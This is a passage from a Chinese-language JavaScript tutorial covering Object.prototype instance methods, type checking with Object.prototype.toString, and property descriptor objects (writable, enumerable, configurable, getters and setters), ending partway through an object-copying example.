<p>除了静态方法，还有不少方法定义在<code>Object.prototype</code>对象。它们称为实例方法，所有<code>Object</code>的实例对象都继承了这些方法。</p>\n<p><code>Object</code>实例对象的方法，主要有以下六个。</p>\n<ul>\n<li><code>Object.prototype.valueOf()</code>：返回当前对象对应的值。</li>\n<li><code>Object.prototype.toString()</code>：返回当前对象对应的字符串形式。</li>\n<li><code>Object.prototype.toLocaleString()</code>：返回当前对象对应的本地字符串形式。</li>\n<li><code>Object.prototype.hasOwnProperty()</code>：判断某个属性是否为当前对象自身的属性，还是继承自原型对象的属性。</li>\n<li><code>Object.prototype.isPrototypeOf()</code>：判断当前对象是否为另一个对象的原型。</li>\n<li><code>Object.prototype.propertyIsEnumerable()</code>：判断某个属性是否可枚举。</li>\n</ul>\n<p>本节介绍前四个方法，另外两个方法将在后文相关章节介绍。</p>\n\n        <h3>\n            <a href='#Object.prototype.valueOf()' class='header-anchor'>#</a>\n            <span>Object.prototype.valueOf()</span>\n        </h3>\n    <p><code>valueOf</code>方法的作用是返回一个对象的“值”，默认情况下返回对象本身。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nobj.valueOf() === obj // true</code></pre><p>上面代码比较<code>obj.valueOf()</code>与<code>obj</code>本身，两者是一样的。</p>\n<p><code>valueOf</code>方法的主要用途是，JavaScript 自动类型转换时会默认调用这个方法（详见《数据类型转换》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\n1 + obj // &quot;1[object Object]&quot;</code></pre><p>上面代码将对象<code>obj</code>与数字<code>1</code>相加，这时 JavaScript 就会默认调用<code>valueOf()</code>方法，求出<code>obj</code>的值再与<code>1</code>相加。所以，如果自定义<code>valueOf</code>方法，就可以得到想要的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nobj.valueOf = function () {\n  return 2;\n};\n\n1 + obj // 3</code></pre><p>上面代码自定义了<code>obj</code>对象的<code>valueOf</code>方法，于是<code>1 + obj</code>就得到了<code>3</code>。这种方法就相当于用自定义的<code>obj.valueOf</code>，覆盖<code>Object.prototype.valueOf</code>。</p>\n\n        <h3>\n            <a href='#Object.prototype.toString()' class='header-anchor'>#</a>\n            <span>Object.prototype.toString()</span>\n        </h3>\n    <p><code>toString</code>方法的作用是返回一个对象的字符串形式，默认情况下返回类型字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = new Object();\no1.toString() // &quot;[object Object]&quot;\n\nvar o2 = {a:1};\no2.toString() // &quot;[object Object]&quot;</code></pre><p>上面代码表示，对于一个对象调用<code>toString</code>方法，会返回字符串<code>[object Object]</code>，该字符串说明对象的类型。</p>\n<p>字符串<code>[object Object]</code>本身没有太大的用处，但是通过自定义<code>toString</code>方法，可以让对象在自动类型转换时，得到想要的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\n\nobj.toString = function () {\n  return &#039;hello&#039;;\n};\n\nobj + &#039; &#039; + &#039;world&#039; // &quot;hello world&quot;</code></pre><p>上面代码表示，当对象用于字符串加法时，会自动调用<code>toString</code>方法。由于自定义了<code>toString</code>方法，所以返回字符串<code>hello world</code>。</p>\n<p>数组、字符串、函数、Date 对象都分别部署了自定义的<code>toString</code>方法，覆盖了<code>Object.prototype.toString</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3].toString() // &quot;1,2,3&quot;\n\n&#039;123&#039;.toString() // &quot;123&quot;\n\n(function () {\n  return 123;\n}).toString()\n// &quot;function () {\n//   return 123;\n// }&quot;\n\n(new Date()).toString()\n// &quot;Tue May 10 2016 09:11:31 GMT+0800 (CST)&quot;</code></pre><p>上面代码中，数组、字符串、函数、Date 对象调用<code>toString</code>方法，并不会返回<code>[object Object]</code>，因为它们都自定义了<code>toString</code>方法，覆盖原始方法。</p>\n\n        <h3>\n            <a href='#toString()-的应用：判断数据类型' class='header-anchor'>#</a>\n            <span>toString() 的应用：判断数据类型</span>\n        </h3>\n    <p><code>Object.prototype.toString</code>方法返回对象的类型字符串，因此可以用来判断一个值的类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.toString() // &quot;[object Object]&quot;</code></pre><p>上面代码调用空对象的<code>toString</code>方法，结果返回一个字符串<code>object Object</code>，其中第二个<code>Object</code>表示该值的构造函数。这是一个十分有用的判断数据类型的方法。</p>\n<p>由于实例对象可能会自定义<code>toString</code>方法，覆盖掉<code>Object.prototype.toString</code>方法，所以为了得到类型字符串，最好直接使用<code>Object.prototype.toString</code>方法。通过函数的<code>call</code>方法，可以在任意值上调用这个方法，帮助我们判断这个值的类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.prototype.toString.call(value)</code></pre><p>上面代码表示对<code>value</code>这个值调用<code>Object.prototype.toString</code>方法。</p>\n<p>不同数据类型的<code>Object.prototype.toString</code>方法返回值如下。</p>\n<ul>\n<li>数值：返回<code>[object Number]</code>。</li>\n<li>字符串：返回<code>[object String]</code>。</li>\n<li>布尔值：返回<code>[object Boolean]</code>。</li>\n<li>undefined：返回<code>[object Undefined]</code>。</li>\n<li>null：返回<code>[object Null]</code>。</li>\n<li>数组：返回<code>[object Array]</code>。</li>\n<li>arguments 对象：返回<code>[object Arguments]</code>。</li>\n<li>函数：返回<code>[object Function]</code>。</li>\n<li>Error 对象：返回<code>[object Error]</code>。</li>\n<li>Date 对象：返回<code>[object Date]</code>。</li>\n<li>RegExp 对象：返回<code>[object RegExp]</code>。</li>\n<li>其他对象：返回<code>[object Object]</code>。</li>\n</ul>\n<p>这就是说，<code>Object.prototype.toString</code>可以看出一个值到底是什么类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.prototype.toString.call(2) // &quot;[object Number]&quot;\nObject.prototype.toString.call(&#039;&#039;) // &quot;[object String]&quot;\nObject.prototype.toString.call(true) // &quot;[object Boolean]&quot;\nObject.prototype.toString.call(undefined) // &quot;[object Undefined]&quot;\nObject.prototype.toString.call(null) // &quot;[object Null]&quot;\nObject.prototype.toString.call(Math) // &quot;[object Math]&quot;\nObject.prototype.toString.call({}) // &quot;[object Object]&quot;\nObject.prototype.toString.call([]) // &quot;[object Array]&quot;</code></pre><p>利用这个特性，可以写出一个比<code>typeof</code>运算符更准确的类型判断函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var type = function (o){\n  var s = Object.prototype.toString.call(o);\n  return s.match(/\\[object (.*?)\\]/)[1].toLowerCase();\n};\n\ntype({}); // &quot;object&quot;\ntype([]); // &quot;array&quot;\ntype(5); // &quot;number&quot;\ntype(null); // &quot;null&quot;\ntype(); // &quot;undefined&quot;\ntype(/abcd/); // &quot;regex&quot;\ntype(new Date()); // &quot;date&quot;</code></pre><p>在上面这个<code>type</code>函数的基础上，还可以加上专门判断某种类型数据的方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var type = function (o){\n  var s = Object.prototype.toString.call(o);\n  return s.match(/\\[object (.*?)\\]/)[1].toLowerCase();\n};\n\n[&#039;Null&#039;,\n &#039;Undefined&#039;,\n &#039;Object&#039;,\n &#039;Array&#039;,\n &#039;String&#039;,\n &#039;Number&#039;,\n &#039;Boolean&#039;,\n &#039;Function&#039;,\n &#039;RegExp&#039;\n].forEach(function (t) {\n  type[&#039;is&#039; + t] = function (o) {\n    return type(o) === t.toLowerCase();\n  };\n});\n\ntype.isObject({}) // true\ntype.isNumber(NaN) // true\ntype.isRegExp(/abc/) // true</code></pre>\n        <h3>\n            <a href='#Object.prototype.toLocaleString()' class='header-anchor'>#</a>\n            <span>Object.prototype.toLocaleString()</span>\n        </h3>\n    <p><code>Object.prototype.toLocaleString</code>方法与<code>toString</code>的返回结果相同，也是返回一个值的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.toString(obj) // &quot;[object Object]&quot;\nobj.toLocaleString(obj) // &quot;[object Object]&quot;</code></pre><p>这个方法的主要作用是留出一个接口，让各种不同的对象实现自己版本的<code>toLocaleString</code>，用来返回针对某些地域的特定的值。目前，主要有三个对象自定义了<code>toLocaleString</code>方法。</p>\n<ul>\n<li>Array.prototype.toLocaleString()</li>\n<li>Number.prototype.toLocaleString()</li>\n<li>Date.prototype.toLocaleString()</li>\n</ul>\n<p>举例来说，日期的实例对象的<code>toString</code>和<code>toLocaleString</code>返回值就不一样，而且<code>toLocaleString</code>的返回值跟用户设定的所在地域相关。</p>\n<pre class=\"prettyprint language-javascript\"><code>var date = new Date();\ndate.toString() // &quot;Tue Jan 01 2018 12:01:33 GMT+0800 (CST)&quot;\ndate.toLocaleString() // &quot;1/01/2018, 12:01:33 PM&quot;</code></pre>\n        <h3>\n            <a href='#Object.prototype.hasOwnProperty()' class='header-anchor'>#</a>\n            <span>Object.prototype.hasOwnProperty()</span>\n        </h3>\n    <p><code>Object.prototype.hasOwnProperty</code>方法接受一个字符串作为参数，返回一个布尔值，表示该实例对象自身是否具有该属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: 123\n};\n\nobj.hasOwnProperty(&#039;p&#039;) // true\nobj.hasOwnProperty(&#039;toString&#039;) // false</code></pre><p>上面代码中，对象<code>obj</code>自身具有<code>p</code>属性，所以返回<code>true</code>。<code>toString</code>属性是继承的，所以返回<code>false</code>。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/08/protecting-objects.html\">Protecting objects in JavaScript</a></li>\n<li>kangax, <a href=\"http://perfectionkills.com/understanding-delete/\">Understanding delete</a></li>\n<li>Jon Bretman, <a href=\"http://techblog.badoo.com/blog/2013/11/01/type-checking-in-javascript/\">Type Checking in JavaScript</a></li>\n<li>Cody Lindley, <a href=\"http://tech.pro/tutorial/1671/thinking-about-ecmascript-5-parts\">Thinking About ECMAScript 5 Parts</a></li>\n<li>Bjorn Tipling, <a href=\"http://bjorn.tipling.com/advanced-objects-in-javascript\">Advanced objects in JavaScript</a></li>\n<li>Javier Márquez, <a href=\"http://arqex.com/967/javascript-properties-enumerable-writable-configurable\">Javascript properties are enumerable, writable and configurable</a></li>\n<li>Sella Rafaeli, <a href=\"http://www.sellarafaeli.com/blog/native_javascript_data_binding\">Native JavaScript Data-Binding</a>: 使用存取函数实现model与view的双向绑定</li>\n<li>Lea Verou, <a href=\"http://lea.verou.me/2015/08/copying-properties-the-robust-way/\">Copying object properties, the robust way</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"属性描述对象","link":"/stdlib/attributes.html"}],"content":"\n        <h1>\n            <a href='#属性描述对象' class='header-anchor'>#</a>\n            <span>属性描述对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>JavaScript 提供了一个内部数据结构，用来描述对象的属性，控制它的行为，比如该属性是否可写、可遍历等等。这个内部数据结构称为“属性描述对象”（attributes object）。每个属性都有自己对应的属性描述对象，保存该属性的一些元信息。</p>\n<p>下面是属性描述对象的一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>{\n  value: 123,\n  writable: false,\n  enumerable: true,\n  configurable: false,\n  get: undefined,\n  set: undefined\n}</code></pre><p>属性描述对象提供6个元属性。</p>\n<p>（1）<code>value</code></p>\n<p><code>value</code>是该属性的属性值，默认为<code>undefined</code>。</p>\n<p>（2）<code>writable</code></p>\n<p><code>writable</code>是一个布尔值，表示属性值（value）是否可改变（即是否可写），默认为<code>true</code>。</p>\n<p>（3）<code>enumerable</code></p>\n<p><code>enumerable</code>是一个布尔值，表示该属性是否可遍历，默认为<code>true</code>。如果设为<code>false</code>，会使得某些操作（比如<code>for...in</code>循环、<code>Object.keys()</code>）跳过该属性。</p>\n<p>（4）<code>configurable</code></p>\n<p><code>configurable</code>是一个布尔值，表示可配置性，默认为<code>true</code>。如果设为<code>false</code>，将阻止某些操作改写该属性，比如无法删除该属性，也不得改变该属性的属性描述对象（<code>value</code>属性除外）。也就是说，<code>configurable</code>属性控制了属性描述对象的可写性。</p>\n<p>（5）<code>get</code></p>\n<p><code>get</code>是一个函数，表示该属性的取值函数（getter），默认为<code>undefined</code>。</p>\n<p>（6）<code>set</code></p>\n<p><code>set</code>是一个函数，表示该属性的存值函数（setter），默认为<code>undefined</code>。</p>\n\n        <h2>\n            <a href='#Object.getOwnPropertyDescriptor()' class='header-anchor'>#</a>\n            <span>Object.getOwnPropertyDescriptor()</span>\n        </h2>\n    <p><code>Object.getOwnPropertyDescriptor</code>方法可以获取属性描述对象。它的第一个参数是一个对象，第二个参数是一个字符串，对应该对象的某个属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\n\nObject.getOwnPropertyDescriptor(obj, &#039;p&#039;)\n// Object { value: &quot;a&quot;,\n//   writable: true,\n//   enumerable: true,\n//   configurable: true\n// }</code></pre><p>上面代码中，<code>Object.getOwnPropertyDescriptor</code>方法获取<code>obj.p</code>的属性描述对象。</p>\n<p>注意，<code>Object.getOwnPropertyDescriptor</code>方法只能用于对象自身的属性，不能用于继承的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\n\nObject.getOwnPropertyDescriptor(obj, &#039;toString&#039;)\n// undefined</code></pre><p>上面代码中，<code>toString</code>是<code>Obj</code>对象继承的属性，<code>Object.getOwnPropertyDescriptor</code>无法获取。</p>\n\n        <h2>\n            <a href='#Object.getOwnPropertyNames()' class='header-anchor'>#</a>\n            <span>Object.getOwnPropertyNames()</span>\n        </h2>\n    <p><code>Object.getOwnPropertyNames</code>方法返回一个数组，成员是参数对象自身的全部属性的属性名，不管该属性是否可遍历。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperties({}, {\n  p1: { value: 1, enumerable: true },\n  p2: { value: 2, enumerable: false }\n});\n\nObject.getOwnPropertyNames(obj)\n// [&quot;p1&quot;, &quot;p2&quot;]</code></pre><p>上面代码中，<code>obj.p1</code>是可遍历的，<code>obj.p2</code>是不可遍历的。<code>Object.getOwnPropertyNames</code>会将它们都返回。</p>\n<p>这跟<code>Object.keys</code>的行为不同，<code>Object.keys</code>只返回对象自身的可遍历属性的全部属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.keys([]) // []\nObject.getOwnPropertyNames([]) // [ &#039;length&#039; ]\n\nObject.keys(Object.prototype) // []\nObject.getOwnPropertyNames(Object.prototype)\n// [&#039;hasOwnProperty&#039;,\n//  &#039;valueOf&#039;,\n//  &#039;constructor&#039;,\n//  &#039;toLocaleString&#039;,\n//  &#039;isPrototypeOf&#039;,\n//  &#039;propertyIsEnumerable&#039;,\n//  &#039;toString&#039;]</code></pre><p>上面代码中，数组自身的<code>length</code>属性是不可遍历的，<code>Object.keys</code>不会返回该属性。第二个例子的<code>Object.prototype</code>也是一个对象，所有实例对象都会继承它，它自身的属性都是不可遍历的。</p>\n\n        <h2>\n            <a href='#Object.defineProperty()，Object.defineProperties()' class='header-anchor'>#</a>\n            <span>Object.defineProperty()，Object.defineProperties()</span>\n        </h2>\n    <p><code>Object.defineProperty</code>方法允许通过属性描述对象，定义或修改一个属性，然后返回修改后的对象，它的用法如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.defineProperty(object, propertyName, attributesObject)</code></pre><p><code>Object.defineProperty</code>方法接受三个参数，依次如下。</p>\n<ul>\n<li>属性所在的对象</li>\n<li>属性名（它应该是一个字符串）</li>\n<li>属性描述对象</li>\n</ul>\n<p>举例来说，定义<code>obj.p</code>可以写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  value: 123,\n  writable: false,\n  enumerable: true,\n  configurable: false\n});\n\nobj.p // 123\n\nobj.p = 246;\nobj.p // 123</code></pre><p>上面代码中，<code>Object.defineProperty</code>方法定义了<code>obj.p</code>属性。由于属性描述对象的<code>writable</code>属性为<code>false</code>，所以<code>obj.p</code>属性不可写。注意，这里的<code>Object.defineProperty</code>方法的第一个参数是<code>{}</code>（一个新建的空对象），<code>p</code>属性直接定义在这个空对象上面，然后返回这个对象，这是<code>Object.defineProperty</code>的常见写法。</p>\n<p>如果属性已经存在，<code>Object.defineProperty</code>方法相当于更新该属性的属性描述对象。</p>\n<p>如果一次性定义或修改多个属性，可以使用<code>Object.defineProperties</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperties({}, {\n  p1: { value: 123, enumerable: true },\n  p2: { value: &#039;abc&#039;, enumerable: true },\n  p3: { get: function () { return this.p1 + this.p2 },\n    enumerable:true,\n    configurable:true\n  }\n});\n\nobj.p1 // 123\nobj.p2 // &quot;abc&quot;\nobj.p3 // &quot;123abc&quot;</code></pre><p>上面代码中，<code>Object.defineProperties</code>同时定义了<code>obj</code>对象的三个属性。其中，<code>p3</code>属性定义了取值函数<code>get</code>，即每次读取该属性，都会调用这个取值函数。</p>\n<p>注意，一旦定义了取值函数<code>get</code>（或存值函数<code>set</code>），就不能将<code>writable</code>属性设为<code>true</code>，或者同时定义<code>value</code>属性，否则会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\nObject.defineProperty(obj, &#039;p&#039;, {\n  value: 123,\n  get: function() { return 456; }\n});\n// TypeError: Invalid property.\n// A property cannot both have accessors and be writable or have a value\n\nObject.defineProperty(obj, &#039;p&#039;, {\n  writable: true,\n  get: function() { return 456; }\n});\n// TypeError: Invalid property descriptor.\n// Cannot both specify accessors and a value or writable attribute</code></pre><p>上面代码中，同时定义了<code>get</code>属性和<code>value</code>属性，以及将<code>writable</code>属性设为<code>true</code>，就会报错。</p>\n<p><code>Object.defineProperty()</code>和<code>Object.defineProperties()</code>的第三个参数，是一个属性对象。它的<code>writable</code>、<code>configurable</code>、<code>enumerable</code>这三个属性的默认值都为<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nObject.defineProperty(obj, &#039;foo&#039;, {});\nObject.getOwnPropertyDescriptor(obj, &#039;foo&#039;)\n// {\n//   value: undefined,\n//   writable: false,\n//   enumerable: false,\n//   configurable: false\n// }</code></pre><p>上面代码中，定义<code>obj.p</code>时用了一个空的属性描述对象，就可以看到各个元属性的默认值。</p>\n\n        <h2>\n            <a href='#Object.prototype.propertyIsEnumerable()' class='header-anchor'>#</a>\n            <span>Object.prototype.propertyIsEnumerable()</span>\n        </h2>\n    <p>实例对象的<code>propertyIsEnumerable</code>方法返回一个布尔值，用来判断某个属性是否可遍历。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.p = 123;\n\nobj.propertyIsEnumerable(&#039;p&#039;) // true\nobj.propertyIsEnumerable(&#039;toString&#039;) // false</code></pre><p>上面代码中，<code>obj.p</code>是可遍历的，而继承自原型对象的<code>obj.toString</code>属性是不可遍历的。</p>\n\n        <h2>\n            <a href='#元属性' class='header-anchor'>#</a>\n            <span>元属性</span>\n        </h2>\n    <p>属性描述对象的各个属性称为“元属性”，因为它们可以看作是控制属性的属性。</p>\n\n        <h3>\n            <a href='#value' class='header-anchor'>#</a>\n            <span>value</span>\n        </h3>\n    <p><code>value</code>属性是目标属性的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.p = 123;\n\nObject.getOwnPropertyDescriptor(obj, &#039;p&#039;).value\n// 123\n\nObject.defineProperty(obj, &#039;p&#039;, { value: 246 });\nobj.p // 246</code></pre><p>上面代码是通过<code>value</code>属性，读取或改写<code>obj.p</code>的例子。</p>\n\n        <h3>\n            <a href='#writable' class='header-anchor'>#</a>\n            <span>writable</span>\n        </h3>\n    <p><code>writable</code>属性是一个布尔值，决定了目标属性的值（value）是否可以被改变。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\nObject.defineProperty(obj, &#039;a&#039;, {\n  value: 37,\n  writable: false\n});\n\nobj.a // 37\nobj.a = 25;\nobj.a // 37</code></pre><p>上面代码中，<code>obj.a</code>的<code>writable</code>属性是<code>false</code>。然后，改变<code>obj.a</code>的值，不会有任何效果。</p>\n<p>注意，正常模式下，对<code>writable</code>为<code>false</code>的属性赋值不会报错，只会默默失败。但是，严格模式下会报错，即使对<code>a</code>属性重新赋予一个同样的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;\nvar obj = {};\n\nObject.defineProperty(obj, &#039;a&#039;, {\n  value: 37,\n  writable: false\n});\n\nobj.a = 37;\n// Uncaught TypeError: Cannot assign to read only property &#039;a&#039; of object</code></pre><p>上面代码是严格模式，对<code>obj.a</code>任何赋值行为都会报错。</p>\n<p>如果原型对象的某个属性的<code>writable</code>为<code>false</code>，那么子对象将无法自定义这个属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var proto = Object.defineProperty({}, &#039;foo&#039;, {\n  value: &#039;a&#039;,\n  writable: false\n});\n\nvar obj = Object.create(proto);\n\nobj.foo = &#039;b&#039;;\nobj.foo // &#039;a&#039;</code></pre><p>上面代码中，<code>proto</code>是原型对象，它的<code>foo</code>属性不可写。<code>obj</code>对象继承<code>proto</code>，也不可以再自定义这个属性了。如果是严格模式，这样做还会抛出一个错误。</p>\n<p>但是，有一个规避方法，就是通过覆盖属性描述对象，绕过这个限制。原因是这种情况下，原型链会被完全忽视。</p>\n<pre class=\"prettyprint language-javascript\"><code>var proto = Object.defineProperty({}, &#039;foo&#039;, {\n  value: &#039;a&#039;,\n  writable: false\n});\n\nvar obj = Object.create(proto);\nObject.defineProperty(obj, &#039;foo&#039;, {\n  value: &#039;b&#039;\n});\n\nobj.foo // &quot;b&quot;</code></pre>\n        <h3>\n            <a href='#enumerable' class='header-anchor'>#</a>\n            <span>enumerable</span>\n        </h3>\n    <p><code>enumerable</code>（可遍历性）返回一个布尔值，表示目标属性是否可遍历。</p>\n<p>JavaScript 的早期版本，<code>for...in</code>循环是基于<code>in</code>运算符的。我们知道，<code>in</code>运算符不管某个属性是对象自身的还是继承的，都会返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n&#039;toString&#039; in obj // true</code></pre><p>上面代码中，<code>toString</code>不是<code>obj</code>对象自身的属性，但是<code>in</code>运算符也返回<code>true</code>，这导致了<code>toString</code>属性也会被<code>for...in</code>循环遍历。</p>\n<p>这显然不太合理，后来就引入了“可遍历性”这个概念。只有可遍历的属性，才会被<code>for...in</code>循环遍历，同时还规定<code>toString</code>这一类实例对象继承的原生属性，都是不可遍历的，这样就保证了<code>for...in</code>循环的可用性。</p>\n<p>具体来说，如果一个属性的<code>enumerable</code>为<code>false</code>，下面三个操作不会取到该属性。</p>\n<ul>\n<li><code>for..in</code>循环</li>\n<li><code>Object.keys</code>方法</li>\n<li><code>JSON.stringify</code>方法</li>\n</ul>\n<p>因此，<code>enumerable</code>可以用来设置“秘密”属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\nObject.defineProperty(obj, &#039;x&#039;, {\n  value: 123,\n  enumerable: false\n});\n\nobj.x // 123\n\nfor (var key in obj) {\n  console.log(key);\n}\n// undefined\n\nObject.keys(obj)  // []\nJSON.stringify(obj) // &quot;{}&quot;</code></pre><p>上面代码中，<code>obj.x</code>属性的<code>enumerable</code>为<code>false</code>，所以一般的遍历操作都无法获取该属性，使得它有点像“秘密”属性，但不是真正的私有属性，还是可以直接获取它的值。</p>\n<p>注意，<code>for...in</code>循环包括继承的属性，<code>Object.keys</code>方法不包括继承的属性。如果需要获取对象自身的所有属性，不管是否可遍历，可以使用<code>Object.getOwnPropertyNames</code>方法。</p>\n<p>另外，<code>JSON.stringify</code>方法会排除<code>enumerable</code>为<code>false</code>的属性，有时可以利用这一点。如果对象的 JSON 格式输出要排除某些属性，就可以把这些属性的<code>enumerable</code>设为<code>false</code>。</p>\n\n        <h3>\n            <a href='#configurable' class='header-anchor'>#</a>\n            <span>configurable</span>\n        </h3>\n    <p><code>configurable</code>(可配置性）返回一个布尔值，决定了是否可以修改属性描述对象。也就是说，<code>configurable</code>为<code>false</code>时，<code>value</code>、<code>writable</code>、<code>enumerable</code>和<code>configurable</code>都不能被修改了。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  value: 1,\n  writable: false,\n  enumerable: false,\n  configurable: false\n});\n\nObject.defineProperty(obj, &#039;p&#039;, {value: 2})\n// TypeError: Cannot redefine property: p\n\nObject.defineProperty(obj, &#039;p&#039;, {writable: true})\n// TypeError: Cannot redefine property: p\n\nObject.defineProperty(obj, &#039;p&#039;, {enumerable: true})\n// TypeError: Cannot redefine property: p\n\nObject.defineProperty(obj, &#039;p&#039;, {configurable: true})\n// TypeError: Cannot redefine property: p</code></pre><p>上面代码中，<code>obj.p</code>的<code>configurable</code>为<code>false</code>。然后，改动<code>value</code>、<code>writable</code>、<code>enumerable</code>、<code>configurable</code>，结果都报错。</p>\n<p>注意，<code>writable</code>只有在<code>false</code>改为<code>true</code>会报错，<code>true</code>改为<code>false</code>是允许的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  writable: true,\n  configurable: false\n});\n\nObject.defineProperty(obj, &#039;p&#039;, {writable: false})\n// 修改成功</code></pre><p>至于<code>value</code>，只要<code>writable</code>和<code>configurable</code>有一个为<code>true</code>，就允许改动。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = Object.defineProperty({}, &#039;p&#039;, {\n  value: 1,\n  writable: true,\n  configurable: false\n});\n\nObject.defineProperty(o1, &#039;p&#039;, {value: 2})\n// 修改成功\n\nvar o2 = Object.defineProperty({}, &#039;p&#039;, {\n  value: 1,\n  writable: false,\n  configurable: true\n});\n\nObject.defineProperty(o2, &#039;p&#039;, {value: 2})\n// 修改成功</code></pre><p>另外，<code>configurable</code>为<code>false</code>时，直接目标属性赋值，不报错，但不会成功。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  value: 1,\n  configurable: false\n});\n\nobj.p = 2;\nobj.p // 1</code></pre><p>上面代码中，<code>obj.p</code>的<code>configurable</code>为<code>false</code>，对<code>obj.p</code>赋值是不会生效的。如果是严格模式，还会报错。</p>\n<p>可配置性决定了目标属性是否可以被删除（delete）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperties({}, {\n  p1: { value: 1, configurable: true },\n  p2: { value: 2, configurable: false }\n});\n\ndelete obj.p1 // true\ndelete obj.p2 // false\n\nobj.p1 // undefined\nobj.p2 // 2</code></pre><p>上面代码中，<code>obj.p1</code>的<code>configurable</code>是<code>true</code>，所以可以被删除，<code>obj.p2</code>就无法删除。</p>\n\n        <h2>\n            <a href='#存取器' class='header-anchor'>#</a>\n            <span>存取器</span>\n        </h2>\n    <p>除了直接定义以外，属性还可以用存取器（accessor）定义。其中，存值函数称为<code>setter</code>，使用属性描述对象的<code>set</code>属性；取值函数称为<code>getter</code>，使用属性描述对象的<code>get</code>属性。</p>\n<p>一旦对目标属性定义了存取器，那么存取的时候，都将执行对应的函数。利用这个功能，可以实现许多高级特性，比如某个属性禁止赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  get: function () {\n    return &#039;getter&#039;;\n  },\n  set: function (value) {\n    console.log(&#039;setter: &#039; + value);\n  }\n});\n\nobj.p // &quot;getter&quot;\nobj.p = 123 // &quot;setter: 123&quot;</code></pre><p>上面代码中，<code>obj.p</code>定义了<code>get</code>和<code>set</code>属性。<code>obj.p</code>取值时，就会调用<code>get</code>；赋值时，就会调用<code>set</code>。</p>\n<p>JavaScript 还提供了存取器的另一种写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  get p() {\n    return &#039;getter&#039;;\n  },\n  set p(value) {\n    console.log(&#039;setter: &#039; + value);\n  }\n};</code></pre><p>上面的写法与定义属性描述对象是等价的，而且使用更广泛。</p>\n<p>注意，取值函数<code>get</code>不能接受参数，存值函数<code>set</code>只能接受一个参数（即属性的值）。</p>\n<p>存取器往往用于，属性的值依赖对象内部数据的场合。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj ={\n  $n : 5,\n  get next() { return this.$n++ },\n  set next(n) {\n    if (n &gt;= this.$n) this.$n = n;\n    else throw new Error(&#039;新的值必须大于当前值&#039;);\n  }\n};\n\nobj.next // 5\n\nobj.next = 10;\nobj.next // 10\n\nobj.next = 5;\n// Uncaught Error: 新的值必须大于当前值</code></pre><p>上面代码中，<code>next</code>属性的存值函数和取值函数，都依赖于内部属性<code>$n</code>。</p>\n\n        <h2>\n            <a href='#对象的拷贝' class='header-anchor'>#</a>\n            <span>对象的拷贝</span>\n        </h2>\n    <p>有时，我们需要将一个对象的所有属性，拷贝到另一个对象，可以用下面的方法实现。</p>\n<pre class=\"prettyprint language-javascript\"><code>var extend = function (to, from) {\n  for (var property in from) {\n    to[property] = from[property];\n  }\n\n  return to;\n}\n\nextend({}, {\n  a: 1\n})\n// {a: 1}</code></pre><p>上面这个方法的问题在于，如果遇到存取器定义的属性，会只拷贝值。</p>\n<pre class=\"prettyprint language-javascript\"><code>extend({}, {\n  get a() { return 1 }\n})\n// {a: 1}</code></pre><p>为了解决这个问题，我们可以通过<code>Object.defineProperty</code>方法来拷贝属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var extend = function (to, from) {\n  for (var property in from) {\n    if (!from.hasOwnProperty(property)) continue;\n    Object.defineProperty(\n      to,\n      property,\n      Object.getOwnPropertyDescriptor(from, property)\n    );\n  }\n\n  return to;\n}\n\nextend({}, { get a(){ return 1 } })\n// 